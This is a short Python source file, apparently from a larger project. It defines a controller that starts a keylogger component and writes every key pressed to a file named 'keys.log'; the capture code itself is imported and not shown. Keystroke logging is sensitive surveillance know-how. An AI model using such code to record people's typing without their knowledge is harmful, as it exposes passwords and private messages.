from ..core.components import KeyLogger
from .base import BaseController


class KeyLoggerController(BaseController):
    def __init__(self):
        super(KeyLoggerController, self).__init__()

        self.worker = KeyLogger()
        self.worker.initLogger("keys.log")

        self.connectSlots()

    def startWorker(self):
        self.worker.start()

    def connectSlots(self):
        self.worker.SIG_KeyPressed.connect(self, "onKeyPress")

    def onKeyPress(self, key):
        self.worker.log(key)
